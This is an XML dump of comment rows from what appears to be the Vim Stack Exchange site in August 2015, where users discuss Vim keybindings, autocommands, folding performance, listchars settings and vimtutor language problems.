  <row Id="6191" PostId="4245" Score="0" Text="I perfectly understand your point, but I think, as the desired effect only affect Vim, I didn't want to use external configuration. The idea behind all this was to make a plugin that be self-sufficient." CreationDate="2015-08-10T14:20:17.197" UserId="1821" />
  <row Id="6192" PostId="4245" Score="0" Text="I can understand why you'd want to enable that feature from your ~/.vimrc rather than from the command line, but in looking through the Vim source, the only way to enable that feature is with the `-w` flag." CreationDate="2015-08-10T15:37:17.147" UserId="2055" />
  <row Id="6193" PostId="4233" Score="0" Text="What I meant was, the regular expression within the url function call up there should receive its own syntax highlighting, marking e.g. groupings in one colour, colour the parentheses, the asterisk, etc. Not just highlight it in one colour as a string (and maybe a second colour for &quot;\n&quot;, &quot;\r&quot; etc.). python_highlight_all does nothing and I cannot find it in the help system. The linked enhanced python highlighting also doesn't do this." CreationDate="2015-08-10T15:48:35.950" UserId="3098" />
  <row Id="6194" PostId="4233" Score="0" Text="Ok, so I'd say that what you want is to extend the highlighting so maybe this link explaining [how to create your own syntax file](http://vim.wikia.com/wiki/Creating_your_own_syntax_files) could help (basically it explains how to match some regex and color them the way you want). Otherwise sorry if that didn't help." CreationDate="2015-08-10T16:00:46.763" UserId="1841" />
  <row Id="6195" PostId="4249" Score="3" Text="I always thought `Ctrl-N` was for _next_, and `Ctrl-P` was for _previous_. That's what they stand for in Emacs, anyway, in which they are bound to `next-line` and `previous-line`. Also, `Ctrl-P` is not _shift in_; it is [_data link escape_](https://en.wikipedia.org/wiki/C0_and_C1_control_codes#DLE). _Shift in_ is `Ctrl-O`." CreationDate="2015-08-10T17:24:08.113" UserId="2680" />
  <row Id="6196" PostId="4249" Score="0" Text="@Lithis I stand corrected." CreationDate="2015-08-10T17:25:38.540" UserId="205" />
  <row Id="6197" PostId="4249" Score="2" Text="@Lithis Honestly, the only thing I know about Emacs is c-x c-e." CreationDate="2015-08-10T17:28:09.147" UserId="205" />
  <row Id="6198" PostId="4246" Score="0" Text="Are you sure they were using the default `Ctrl-J` binding?  It seems to be common, at least among those I know, to map `Ctrl-J/K` to &quot;down/up until the next line with the same indentation level as the starting line&quot;." CreationDate="2015-08-10T17:31:44.343" UserId="3127" />
  <row Id="6199" PostId="4237" Score="1" Text="Well, Vim's swap files are hidden files (leading `.` in the filename) so the right pattern would be `.*.sw[a-p]` (although in pathological cases, you could actually get all the way to `.foo.saa`).  That should also preclude matching Flash files, since I doubt those would typically be a hidden file." CreationDate="2015-08-10T18:33:50.387" UserId="15" />
  <row Id="6200" PostId="4237" Score="0" Text="@jamessan The leading `.` is required in a shell glob, but `*.swp` works as an argument to `find`. But the leading `.` makes things simpler. Thanks!" CreationDate="2015-08-10T18:47:32.917" UserId="2680" />
  <row Id="6201" PostId="4252" Score="2" Text="The question is, I guess, why isn't it already there, in OP case?" CreationDate="2015-08-10T19:09:51.247" UserId="1800" />
  <row Id="6202" PostId="4251" Score="2" Text="It works on my gVim (version 7.4-798). What's the result of running `:set ft?` and `:set comments?`. What's your Vim version? Do you have `:filetype plugin indent on` in your vimrc ?" CreationDate="2015-08-10T19:09:53.683" UserId="1800" />
  <row Id="6203" PostId="4252" Score="0" Text="@VanLaser I don't know, maybe my vimrc or existing plugins messed with it (if it was supposed to?) It solves the issue, though. Thank you all!" CreationDate="2015-08-10T19:11:12.633" UserId="3128" />
  <row Id="6204" PostId="4251" Score="0" Text="I don't have that, VanLaser. I actually have `&quot;filetype plugin on&#xA;` commented, I recall actively doing so for some reason I don't remember. `set ft?` gives `haskell`, and `set comments` gives `comments=s1:/*,mb:*,ex:*/,://,b:#,:%,:XCOMM,n:&gt;,fb:-` (before Lithis's answer)." CreationDate="2015-08-10T19:13:01.203" UserId="3128" />
  <row Id="6205" PostId="4251" Score="0" Text="Yes, no wonder the comments aren't recognized ... :)" CreationDate="2015-08-10T19:16:57.293" UserId="1800" />
  <row Id="6207" PostId="4251" Score="2" Text="Okay I see the `filetype plugin` is what VIM uses for filetype based comments." CreationDate="2015-08-10T19:22:09.293" UserId="3128" />
  <row Id="6208" PostId="4246" Score="4" Text="I'd like to answer to &quot; Why are there 5 ways to go down and only 3 to go up?&quot; Well - it's because, in life, things *go south* way easier! :)" CreationDate="2015-08-10T19:30:36.007" UserId="1800" />
  <row Id="6209" PostId="4210" Score="0" Text="I want to apologize: I haven't forgotten about this. Life happened. Thank you so much statox and Carpetsmoker for writing this out. The redirection is very useful. I am catching up with vim script. joeytwiddle's solution is almost what I wanted. Vimscript is so great. I was using http://learnvimscriptthehardway.stevelosh.com/ for script lessons, but I like statox's tutorial. Just have to catch up with this." CreationDate="2015-08-11T00:57:51.357" UserId="3006" />
  <row Id="6210" PostId="4114" Score="0" Text="Thank you joeytwiddle. This works really well, but as you said needs some work. The formatting is off, but i've been using this in the interim - the idea definitely works well (for me at least). As I mentioned above: I don't mean any disrespect by keeping silent - was busy for a while. Thank you and let me try all this. VimScript gets funky with some tasks. ;)" CreationDate="2015-08-11T01:00:13.440" UserId="3006" />
  <row Id="6211" PostId="4210" Score="0" Text="That's ok @Serge it happens to forget :-) LearVStheHardWay really is a good learning material (considering buying the book to support the author might be a good idea btw). This post will not replace hours of reading and months of practicing but I hope it will help you to begin is something! Also if you think that one answer actually answer your question feel free to accept it by clicking the green tick under the downvote button." CreationDate="2015-08-11T05:19:52.620" UserId="1841" />
  <row Id="6212" PostId="4255" Score="0" Text="Have you set either of [`timeoutlen` or `ttimeoutlen`](http://vimdoc.sourceforge.net/htmldoc/options.html#'timeoutlen')?" CreationDate="2015-08-11T06:47:32.983" UserId="205" />
  <row Id="6213" PostId="4260" Score="0" Text="It might be nice to have a key to undo automatically back to the last unmodified state. But `:e!` is also a nice solution; these days Vim will even keep your &quot;discarded&quot; changes in the undo history." CreationDate="2015-08-11T06:52:20.170" UserId="630" />
  <row Id="6214" PostId="4249" Score="0" Text="Historical and clear answer, thanks a lot Muru! I should have thought of the ascii code of the characters the answer often lies in there." CreationDate="2015-08-11T07:59:15.067" UserId="1841" />
  <row Id="6215" PostId="4261" Score="0" Text="If you want, you can use `nnoremap q: :q` to quit when you accidentally type `q:` instead of `:q`." CreationDate="2015-08-11T07:59:34.097" UserId="51" />
  <row Id="6216" PostId="4248" Score="0" Text="Thanks for the enlighting! I greatly agree on the `&lt;CR&gt;` mapping. Also one more question: I know that those &quot;key combinations&quot; are not actually called mappings but I'm not sure how I should call them?" CreationDate="2015-08-11T08:01:52.220" UserId="1841" />
  <row Id="6217" PostId="4254" Score="0" Text="Possible duplicate : http://stackoverflow.com/a/1925046/2558252" CreationDate="2015-08-11T08:02:14.417" UserId="1821" />
  <row Id="6218" PostId="4246" Score="0" Text="@VanLaser really great answer, they should consider adding this hint in the doc! ;-)" CreationDate="2015-08-11T08:03:23.867" UserId="1841" />
  <row Id="6219" PostId="4248" Score="0" Text="That's an interesting question, I tend to call them &quot;commands&quot;." CreationDate="2015-08-11T08:17:10.090" UserId="54" />
  <row Id="6220" PostId="4248" Score="0" Text="I may be wrong but isn't &quot;command&quot; referring to the ex mode commands like `:ls`, `:substitute`, `new`, etc...?" CreationDate="2015-08-11T08:41:55.367" UserId="1841" />
  <row Id="6221" PostId="4254" Score="3" Text="What exactly are you refering to as your &quot;airline buffer&quot;? I don't understand what is resized and shouldn' be, maybe a screenshot would be useful here." CreationDate="2015-08-11T08:50:12.910" UserId="1841" />
  <row Id="6223" PostId="4248" Score="0" Text="`x` is also a &quot;command&quot;." CreationDate="2015-08-11T09:06:00.383" UserId="54" />
  <row Id="6224" PostId="4248" Score="0" Text="Indeed I just saw that the doc calls `x`, `dd`, `c`, etc &quot;commands&quot;. So you must be right, I guess that `j` or `^J` are also commands." CreationDate="2015-08-11T09:12:51.937" UserId="1841" />
  <row Id="6225" PostId="4254" Score="0" Text="@statox: Before &lt;S-j&gt;: http://postimg.org/image/5a8f56hcx/&#xA;&#xA;&#xA;Afterwards: http://postimg.org/image/cgux9tgp1/JK&#xA;&#xA;i want that the second picture isn't possible to achieve, e.g. the buffer should always stay as in picture 1." CreationDate="2015-08-11T09:20:24.890" UserId="2354" />
  <row Id="6226" PostId="4254" Score="0" Text="The second image is not found ;-) Also put the screenshots in your question (with the &quot;edit&quot; button, the editor will give you the possibility to add a screenshot that you don't have to host yourself) rather than in the comments please." CreationDate="2015-08-11T09:22:38.103" UserId="1841" />
  <row Id="6227" PostId="4248" Score="0" Text="@statox the docs call `j`, `h` etc. motions, so that's what I call them." CreationDate="2015-08-11T09:37:37.920" UserId="205" />
  <row Id="6228" PostId="4248" Score="0" Text="@muru damn you're right!" CreationDate="2015-08-11T09:48:39.427" UserId="1841" />
  <row Id="6229" PostId="4254" Score="0" Text="@Nobe4 Do you have an idea, how i could assign &quot;set wfh&quot; and &quot;set wfw&quot; to a particular buffer? I mean, i like the ability to resize the other windows/buffers." CreationDate="2015-08-11T09:51:07.170" UserId="2354" />
  <row Id="6230" PostId="4254" Score="0" Text="@toogley, maybe you should remove the link to airline (most of the user know it or can google it has it is a well know plugin) and put 2 screenshots of before/after. Also don't hesitate to circle where the problem is or something like that. Your airline seems pretty normal to me." CreationDate="2015-08-11T10:06:23.653" UserId="1841" />
  <row Id="6231" PostId="4254" Score="0" Text="Oh I think I get it: when you have 2 splitted windows you have one airline at the bottom of each window and you would like to have only one at the bottom of your screen. Am I right?" CreationDate="2015-08-11T10:06:52.973" UserId="1841" />
  <row Id="6232" PostId="4050" Score="0" Text="@joeytwiddle I saw your comment just now after posting an answer with such a function. Is it like what you had in mind?" CreationDate="2015-08-11T10:39:15.500" UserId="1306" />
  <row Id="6233" PostId="4261" Score="0" Text="I like how all the commands in the command line window screenshot are concerned with quitting vim." CreationDate="2015-08-11T10:47:17.927" UserId="21" />
  <row Id="6234" PostId="4254" Score="0" Text="I think it's simply that his statusline moves up, and the cmd line height grows, while the single window shrinks." CreationDate="2015-08-11T11:28:40.543" UserId="1800" />
  <row Id="6235" PostId="4210" Score="0" Text="@statox I've made a rather massive edit here. It started with [the spoiler markdown](http://vi.stackexchange.com/editing-help#spoilers) (which SE does support for [code as well](http://meta.stackexchange.com/questions/105735/how-can-i-put-a-whole-code-block-in-spoiler-text)), and some grammar fixes, but I decided to replace the list with headers too. I hope I didn't mess up the function - I removed the numbers now that they're in a spoiler." CreationDate="2015-08-11T12:11:45.313" UserId="205" />
  <row Id="6236" PostId="4210" Score="0" Text="@muru: Amazing editing job, thanks a lot! :-)" CreationDate="2015-08-11T12:43:42.980" UserId="1841" />
  <row Id="6237" PostId="4254" Score="0" Text="@VanLaser exactly." CreationDate="2015-08-11T13:00:24.853" UserId="2354" />
  <row Id="6238" PostId="4050" Score="0" Text="@jjaderberg Yes it is. Great job!" CreationDate="2015-08-11T14:30:41.783" UserId="630" />
  <row Id="6239" PostId="4260" Score="1" Text="That command is `:earlier 1f`.  The `1f` means &quot;1 previous saved state&quot;, so it will go back to the previous time you saved the file.  If the buffer is modified, then that undoes all the modifications.  If the buffer isn't modified (i.e., it is currently in a saved state), then it will go to the previous time you saved the file." CreationDate="2015-08-11T14:34:38.967" UserId="15" />
  <row Id="6240" PostId="4255" Score="0" Text="Yes and it shouldn’t matter because both keys should be affected by that setting in the same way" CreationDate="2015-08-11T15:17:39.557" UserId="390" />
  <row Id="6242" PostId="4255" Score="0" Text="I suppose this must be because `&lt;leader&gt;` always begins mappings, but `g` can begin Vim commands as well. (There's an entire section dedicated to &quot;Commands starting with `g`&quot;.) Similar effect for `]`, `q`" CreationDate="2015-08-11T16:03:51.247" UserId="205" />
  <row Id="6243" PostId="4255" Score="0" Text="i'll see if I can find other examples of keys that behave like `g` does" CreationDate="2015-08-11T16:05:57.670" UserId="390" />
  <row Id="6244" PostId="4255" Score="0" Text="Ninja'd. I added a couple of examples: `]`, `q`" CreationDate="2015-08-11T16:06:28.953" UserId="205" />
  <row Id="6245" PostId="4255" Score="0" Text="You may be on to something because `q` does do it. Same with `[`, `]`. I guess that's it. if there are built-in maps beginning with the key (and the plain key isnt bound, e.g. no `map q`) then it will wait indefinitely." CreationDate="2015-08-11T16:07:59.380" UserId="390" />
  <row Id="6246" PostId="4255" Score="0" Text="Actually, I think any normal-mode command that's specified as being followed by another key will behave like this, I think. Like `m`, `'`,  `f`/`F`/`t`,`T`, etc." CreationDate="2015-08-11T16:09:38.357" UserId="205" />
  <row Id="6247" PostId="2772" Score="0" Text="It works without problems on my Windows 10 / gVim 7.4 too." CreationDate="2015-08-11T16:39:33.637" UserId="2942" />
  <row Id="6248" PostId="4245" Score="0" Text="What exactly are you trying to do? [(XY Problem)](http://meta.stackexchange.com/a/66378/188334) For instance, if you are mainly interested on recording your keystrokes could try to use recording (`q`) with some autocommand to write it to a file from time to time." CreationDate="2015-08-11T17:35:31.537" UserId="1405" />
  <row Id="6249" PostId="4122" Score="0" Text="Just checked, and yes, `autoread` is set @Carpetsmoker" CreationDate="2015-08-11T18:53:07.627" UserId="3016" />
  <row Id="6250" PostId="4255" Score="0" Text="According to `:h ttimeout` when `timeout` is off and `ttimeout` is on then Vim times out on key codes but not on mappings, could it be your situation?" CreationDate="2015-08-11T19:30:07.140" UserId="1841" />
  <row Id="6251" PostId="3908" Score="0" Text="If you `&lt;c-w&gt;=` does that fix the layout?" CreationDate="2015-08-11T20:28:49.397" UserId="248" />
  <row Id="6252" PostId="3908" Score="0" Text="i could take a look, but i've eloped with emacs/magit..." CreationDate="2015-08-11T20:30:54.073" UserId="2778" />
  <row Id="6253" PostId="4181" Score="1" Text="It is *possible*, since I have macvim installed and it never does that. I've only ever installed it using homebrew. Did you `brew link macvim` without any issues? What happens if you start macvim in an iterm instance with `mvim -v`?" CreationDate="2015-08-11T20:32:23.430" UserId="248" />
  <row Id="6254" PostId="2004" Score="0" Text="@WillAnderson : I would wager, that anybody interested in vim debugging has known how to create shortcuts on his systems for *years*, if not decades. I consider that paragraph&amp;footnote 100% off-topic, only adds clutter. The space would be better used mentioning '-D'" CreationDate="2015-08-11T20:37:39.927" UserId="3102" />
  <row Id="6255" PostId="4245" Score="0" Text="I am trying to know how can I record all characters typed inside vim (like the `-w` flag does) but without having to alias vim." CreationDate="2015-08-11T20:48:41.670" UserId="1821" />
  <row Id="6256" PostId="4258" Score="0" Text="Thanks for your reply, two questions. Do you mean that the line `shopt -s extglob` should be added into the `.bashrc` file? If I'm using windows cmd line, is there any way to achieve that?" CreationDate="2015-08-11T22:44:38.003" UserId="1080" />
  <row Id="6257" PostId="4258" Score="0" Text="Yes, `shopt -s extglob` should be added to your `~/.bashrc` because it is off by default, at least in bash 4.2.45. I don't know of anything similar in the Windows Command Prompt, but I don't know Windows very well. I use Cygwin to keep my sanity while using Windows." CreationDate="2015-08-12T00:03:37.697" UserId="2055" />
  <row Id="6258" PostId="4259" Score="0" Text="Thanks for your solution. I was looking for an easy do-it-all setting that would somehow disable all the errors. I guess it doesn't exist. What I ended up using was a combinations of if statement checks and pathogen's  `g:pathogen_disabled` variable." CreationDate="2015-08-12T04:46:42.400" UserId="1623" />
  <row Id="6259" PostId="4264" Score="0" Text="Thanks for your solution. I'm not using vim-plug unfortunately. I was able to find a pathogen-centric solution however." CreationDate="2015-08-12T04:47:48.217" UserId="1623" />
  <row Id="6260" PostId="4264" Score="0" Text="You're welcome! If your solution differs from the already existing answers don't hesitate to answer your own question it might be useful to other users :-)" CreationDate="2015-08-12T04:54:54.123" UserId="1841" />
  <row Id="6261" PostId="4264" Score="1" Text="One step ahead of you :)" CreationDate="2015-08-12T04:58:18.143" UserId="1623" />
  <row Id="6262" PostId="4279" Score="0" Text="Does your `ftplugin/text.vim` have a `if exists(&quot;b:did_ftplugin&quot;)` section at the beginning to `finish` early if some ftplugin has already been `did`? And do you set `b:did_ftplugin` in your `ftplugin/bunchofFilesFT.vim`?" CreationDate="2015-08-12T08:15:00.877" UserId="1306" />
  <row Id="6263" PostId="4280" Score="0" Text="What's wrong with `BufReadPost`? You could also use `BufReadCmd`." CreationDate="2015-08-12T08:21:47.087" UserId="51" />
  <row Id="6264" PostId="4280" Score="0" Text="I also expected `BufReadPost` and `BufReadCmd` to work, but for some reason it doesn't work. However, I found that `BufWinEnter` does work. I didn't think of trying a different event, so thanks for suggesting!&#xA;&#xA;However, the main point of the question is not which autocommand event that is appropriate, but if there is a way to make this work even when I open several buffers simultaneously. Even with `BufWinEnter` I have the same problem as described." CreationDate="2015-08-12T08:38:44.880" UserId="21" />
  <row Id="6265" PostId="4268" Score="0" Text="Thanks for your answer but as discussed in the comments, the solution I wanted should not require an alias." CreationDate="2015-08-12T09:59:10.883" UserId="1821" />
  <row Id="6266" PostId="4280" Score="0" Text="What vim version and patch level?  I know I have run into bugs in 7.4 that have been fixed in the patches." CreationDate="2015-08-12T10:15:49.403" UserId="1430" />
  <row Id="6267" PostId="4280" Score="0" Text="Your attempt doesn't make sense, `autocmd`s are not applied in the order they are defined.  Re: `BufReadPost` not working: perhaps you need a `nested` flag?  Re: running a function only once per file: you can set a buffer-local variable to signal the function has run." CreationDate="2015-08-12T10:18:44.987" UserId="2313" />
  <row Id="6268" PostId="4280" Score="0" Text="@cxw I'm on Vim 7.4.778." CreationDate="2015-08-12T10:42:32.480" UserId="21" />
  <row Id="6269" PostId="4280" Score="0" Text="@SatoKatsura I've clarified the question and improved the current technique. As mentioned, the current technique works mostly OK, except for the case when I open several buffers in different tabs." CreationDate="2015-08-12T10:51:58.967" UserId="21" />
  <row Id="6270" PostId="4279" Score="0" Text="No, I didn't. I guess this is the canonical way to proceed for what I want?" CreationDate="2015-08-12T11:20:04.637" UserId="985" />
  <row Id="6274" PostId="3654" Score="0" Text="Maybe the vim built-in function `fnameescape()` could help you?" CreationDate="2015-08-11T14:02:48.223" UserId="3102" />
  <row Id="6275" PostId="4289" Score="0" Text="Thanks, I thought using `\zs`/`\ze` is enough to catch the previous reference value, but it seems the brackets are mandatory." CreationDate="2015-08-12T13:52:04.930" UserId="467" />
  <row Id="6276" PostId="4288" Score="1" Text="I don't think you can do it without a little bit of scripting. You can look at `:h sign` to know how to place a sign in the singbar and use it as the number bar" CreationDate="2015-08-12T14:39:50.533" UserId="1821" />
  <row Id="6277" PostId="4280" Score="1" Text="I don't understand the need for the augroups. A BufWinEnter autocmd like this is all you should need: `au BufWinEnter * if &amp;ft == &quot;text&quot; | call MyFunction() | endif`. Get rid of the autocmd and augroup stuff in MyFunction() and leave just `... do stuff ...`." CreationDate="2015-08-12T15:05:07.113" UserId="2055" />
  <row Id="6278" PostId="4283" Score="0" Text="IMHO this is still crazy use of autocmds. But you don't seem to care to hear that anyway." CreationDate="2015-08-12T15:18:43.073" UserId="2313" />
  <row Id="6279" PostId="3654" Score="0" Text="@nfarrar If you found a working solution to your problem it would be better if you could post it as an answer rather than putting it in your question ;-)" CreationDate="2015-08-12T15:33:31.060" UserId="1841" />
  <row Id="6280" PostId="4286" Score="0" Text="Can you please add some more explanation?" CreationDate="2015-08-12T15:42:24.773" UserId="865" />
  <row Id="6281" PostId="4292" Score="1" Text="Are you NerdTree buffers truly unlisted? Check `:ls!`. Do you get `0` when do `:echo buflisted(bufnr('%'))` inside the NerdTree buffer? You may also want to use `has_key(g:MyDic, newBufNr)`. See `:h has_key`. Maybe it would be best to use `expand('&lt;abuf&gt;')` in your autocmd calls. See `:h &lt;abuf&gt;`" CreationDate="2015-08-12T15:55:43.003" UserId="778" />
  <row Id="6282" PostId="4286" Score="0" Text="@EvergreenTree Done." CreationDate="2015-08-12T16:04:26.913" UserId="467" />
  <row Id="6284" PostId="4243" Score="0" Text="I think, this is more or less my final &quot;solution&quot;, until NetRW can do this natively. I will still take care of remaining known issues, but expect to find (or be pointed to) more subtle bugs, fixes, and enhancements. They will be addressed/incorporated. Thank you for commenting." CreationDate="2015-08-12T18:47:27.683" UserId="3102" />
  <row Id="6285" PostId="4294" Score="1" Text="`:helpgrep SpecialComment`" CreationDate="2015-08-12T18:59:41.250" UserId="54" />
  <row Id="6286" PostId="4294" Score="0" Text="@romainl `special things inside a comment` which is that result isn't really any more helpful." CreationDate="2015-08-12T19:03:07.247" UserId="25" />
  <row Id="6287" PostId="4294" Score="0" Text="Yes it is helpful: it tells you that you shouldn't worry about it." CreationDate="2015-08-12T19:19:03.547" UserId="54" />
  <row Id="6288" PostId="4297" Score="0" Text="Hm, this seems to work for me? When you use `nnoremap`, you always map the original built-in Vim meaning of the right-hand-side, so I see no reason why this shouldn't work..." CreationDate="2015-08-12T20:06:31.733" UserId="51" />
  <row Id="6289" PostId="4294" Score="0" Text="@Dom ever used a `TODO` or `FIXME` in a comment?" CreationDate="2015-08-12T20:11:35.180" UserId="205" />
  <row Id="6290" PostId="4294" Score="0" Text="@muru yep and there's group already for `TODO`, `FIXME`, and others under Todo in the highlight syntax." CreationDate="2015-08-12T20:24:30.153" UserId="25" />
  <row Id="6291" PostId="462" Score="0" Text="and without printing messages on screen :silent! bufdo e" CreationDate="2015-08-12T20:26:19.677" UserId="3159" />
  <row Id="6292" PostId="4294" Score="0" Text="It's Vim: customize to your taste! E.g. (for a C file): `syn match SpecialComment '///.*\n'` :P" CreationDate="2015-08-12T20:31:38.513" UserId="1800" />
  <row Id="6293" PostId="4280" Score="0" Text="@garyjohn Your solution would mean that the function is called everytime the buffer is entered after it has been hidden. It is essential that the function is called only once, and that it is called AFTER the filetype plugins have been sourced." CreationDate="2015-08-12T20:35:30.497" UserId="21" />
  <row Id="6294" PostId="4283" Score="1" Text="@SatoKatsura It is still the only solution to my problem that I know of so far. However, the problem itself might be badly described. Unfortunately, I do not really understand what about it that is difficult to understand. That is, your idea of setting a buffer local variable might also work. In any case, I see that I need to clarify the problem, so I will update the question." CreationDate="2015-08-12T20:36:49.917" UserId="21" />
  <row Id="6295" PostId="4294" Score="1" Text="@Dom Ah. Yes. Ok, I went looking and it seems Josh is right. There was no usage of `SpecialComment` in syntastic, and of the stuff shipped by my distro (Ubuntu 14.04, `SpecialComment`s were used by only a few major syntax files - `vim`, Java (Javadoc comment headers), Haskell (pragmas), and some more." CreationDate="2015-08-12T20:47:22.260" UserId="205" />
  <row Id="6296" PostId="4280" Score="0" Text="I have now updated the question again. I have provided more background, as it seems necessary to understand the problem. Perhaps I am asking the wrong question, but so far I have not found any solution that works except the one I have posted below. I would be happy if anyone have a more elegant solution." CreationDate="2015-08-12T21:03:00.057" UserId="21" />
  <row Id="6297" PostId="4283" Score="1" Text="@SatoKatsura I do not understand why you say I &quot;don't seem to care to hear that anyway&quot;; I would be very happy to get alternative and perhaps better solutions. I have now updated the question in order to provide some more background. I think that should make it easier to see why my use of autocommands is not that crazy. And if they are, then I would be VERY happy to hear of a different way of doing this." CreationDate="2015-08-12T21:06:57.877" UserId="21" />
  <row Id="6299" PostId="4297" Score="1" Text="This works for me too, maybe try using `vim -u NONE` to see if any of your plugins are causing issues" CreationDate="2015-08-12T21:25:11.037" UserId="1472" />
  <row Id="6300" PostId="4298" Score="0" Text="It may be a ... VI.rus ! (just kidding). I'd simply install a recent Vim, e.g. https://bintray.com/veegee/generic/vim_x64." CreationDate="2015-08-12T21:39:13.307" UserId="1800" />
  <row Id="6301" PostId="4298" Score="1" Text="@VanLaser Haha - no. `vimtutor en` starts it in english, however this is not the default. If I do `vimtutor` only, it opens up in portuguese." CreationDate="2015-08-12T21:44:18.537" UserId="3160" />
  <row Id="6302" PostId="4280" Score="0" Text="BufWinEnter _is_ triggered _after_ the filetype plugins have been sourced. You have a good point about the hidden-to-displayed transition, though. I never hide buffers, so I often forget about that case. A solution to that would be to set b:myfunction_called when MyFunction() is called and add a test for `exists(&quot;b:myfunction_called&quot;)` to the autocommand, so that MyFunction() is called only once per buffer." CreationDate="2015-08-12T22:59:10.273" UserId="2055" />
  <row Id="6303" PostId="4300" Score="3" Text="Try `:set lazyredraw` (`:h lazyredraw`)" CreationDate="2015-08-13T01:10:32.820" UserId="1800" />
  <row Id="6304" PostId="4283" Score="0" Text="No offense intended, but this is the only solution known to you because you stopped looking.  How about calling `windo normal zx` to update the folding, and setting the defaults in a ftplugin for new files.  `autocmd`s are fragile commands with many known problems. They are not applied in a logical order, they may not refer to the file you think, they may not be applied at the right time, etc.  You should try to avoid them when possible.  Instead, you use `CursorMoved` which is one of the worst offenders, to do one-time operations.  And the &quot;self-destructing&quot; thing might earn you a segfault." CreationDate="2015-08-13T02:17:41.307" UserId="2313" />
  <row Id="6305" PostId="4283" Score="0" Text="Also, as far as I can tell the performance problem reported on GitHub has a very different root: `foldexpr` is called insanely often (and particularly so in insert mode) because of a long-standing bug in Vim, and you're making it worse with carelessly written regexps.  Simply shuffling things around and getting rid of all those lookdbehinds can save you from going straight to the worst case scenario and speed things up considerably.  But the better approach would be to simply disable `foldexpr` when in insert mode.  There are other problems there, but you didn't ask about that. _shrug_" CreationDate="2015-08-13T02:27:40.830" UserId="2313" />
  <row Id="6306" PostId="4284" Score="0" Text="I would say that pressing `&lt;Alt-&lt;&gt;` and `&lt;Alt-&gt;&gt;` insert another character the one you would expected, so I could explain your issue... e.g. on my computer it insert respectivly `¯` and `˘`" CreationDate="2015-08-13T04:16:08.317" UserId="1821" />
  <row Id="6307" PostId="4297" Score="0" Text="This worked for me also, I noticed that both `,` and `#` can be used now to find the previous match." CreationDate="2015-08-13T04:20:15.540" UserId="1821" />
  <row Id="6308" PostId="4303" Score="2" Text="That's a lot of trouble when you could do `set listchars=tab:\ \ ,...`." CreationDate="2015-08-13T07:27:17.720" UserId="54" />
  <row Id="6309" PostId="4303" Score="0" Text="@romainl then make an answer :)" CreationDate="2015-08-13T07:27:42.003" UserId="3164" />
  <row Id="6310" PostId="4304" Score="0" Text="Didn't know you could do `\ `, though it makes sense since you can search with them (`/\ `). I was trying `\s`, `' '`, etc." CreationDate="2015-08-13T07:33:55.520" UserId="3164" />
  <row Id="6311" PostId="4304" Score="0" Text="Hm, I get `E474: Invalid argument: listchars=tab:\ \ ,...` with Vim 7.4.778?" CreationDate="2015-08-13T08:10:46.647" UserId="51" />
  <row Id="6312" PostId="4298" Score="1" Text="What the value of `v:lang`? `:echo v:lang`." CreationDate="2015-08-13T08:12:46.367" UserId="51" />
  <row Id="6313" PostId="4304" Score="0" Text="@Carpetsmoker, the three dots are here for elision." CreationDate="2015-08-13T08:21:37.213" UserId="54" />
  <row Id="6314" PostId="4283" Score="0" Text="@SatoKatsura My code supports two modes for folding: One automatic and one manual. The manual mode keeps `foldexpr` disabled at all times, except during a manual refresh. The automatic mode enables `foldexpr` in insert mode. Berhaps the automatic mode instead should enable `foldexpr` during normal mode instead of insert mode, that seems to make more sense." CreationDate="2015-08-13T08:22:06.347" UserId="21" />
  <row Id="6315" PostId="4283" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/26918/discussion-between-karl-yngve-lervag-and-sato-katsura)." CreationDate="2015-08-13T08:22:15.433" UserId="21" />
  <row Id="6316" PostId="4299" Score="0" Text="cool script, thanks for the effort!" CreationDate="2015-08-13T08:25:03.883" UserId="2512" />
  <row Id="6317" PostId="4302" Score="1" Text="Note that setting a space as a tab means you won't be able to distinguish between spaces and tabs, or see tabs in other places (like inside a string, end of the line). It sort of defeats the purpose of `set list` ;-) Some other (smaller) character you may try: `·` (MIDDLE DOT),  `␣` (OPEN BOX) or `₋` (SUBSCRIPT MINUS). (I personally use: `set listchars=tab:!·`)." CreationDate="2015-08-13T08:28:28.910" UserId="51" />
  <row Id="6318" PostId="4304" Score="1" Text="Oops, yes, I got confused :-/" CreationDate="2015-08-13T08:28:36.620" UserId="51" />
  <row Id="6319" PostId="4302" Score="0" Text="@Carpetsmoker correct. This is why I have a linter. :) Exclamation point might not be so bad, I suppose I could play around with them." CreationDate="2015-08-13T08:28:59.997" UserId="3164" />
  <row Id="6320" PostId="4304" Score="0" Text="@Carpetsmoker try `set listchars=tab:\ \ ,trail:·,eol:¬,nbsp:_`" CreationDate="2015-08-13T08:29:59.773" UserId="3164" />
  <row Id="6321" PostId="4280" Score="0" Text="Yes, I agree, that would seem like a solution. However, when I test it, it seems `BufWinEnter` does not work fully as expected. That is, for some reason, it still won't work with `vim -p *.tex`." CreationDate="2015-08-13T08:30:08.270" UserId="21" />
  <row Id="6322" PostId="4301" Score="2" Text="FYI, with xterm on Linux I get `0x1b 0x3e` and `0x1b 0x3c` With `Alt+&lt;` and `Alt+&gt;` (in other words, I get the expected Esc+key, instead of the MACRON and BREVE characters)." CreationDate="2015-08-13T09:00:59.470" UserId="51" />
  <row Id="6323" PostId="4292" Score="0" Text="As I said in my question I debugged the buflisted property of nerdtree buffers and I confirm that the value of `buflisted(bufnr('%'))` for nerdtree buffers is 0. Also I didn't know `:ls!` but I get a `u` in front of those buffers, so know I'm really sure they are unlisted :-) Thanks for your other advices I'll definitely check them!" CreationDate="2015-08-13T09:24:10.170" UserId="1841" />
  <row Id="6324" PostId="4298" Score="0" Text="@Carpetsmoker It's PT (portuguese). Is this what I need to change?" CreationDate="2015-08-13T11:38:37.697" UserId="3160" />
  <row Id="6325" PostId="4298" Score="0" Text="So that's the source of the problem ;-) [`:help v:lang`](http://vimhelp.appspot.com/eval.txt.html#v%3alang) tells me it should be inherited from the OS (Windows in your case), or set explicitly by the user with the `:language` command ... But that won't help you, since the tutor file has already been loaded in the wrong language..." CreationDate="2015-08-13T11:53:16.243" UserId="51" />
  <row Id="6326" PostId="4298" Score="0" Text="@Carpetsmoker So what is the solution?" CreationDate="2015-08-13T11:53:48.347" UserId="3160" />
  <row Id="6327" PostId="4298" Score="0" Text="I don't know ;-) If I had one, I would have offered it. Perhaps one of your locale settings is in Portuguese? There's a control panel thingy to set this (`Clock, Language, and Region`, and then `Region and Language`)." CreationDate="2015-08-13T12:27:33.943" UserId="51" />
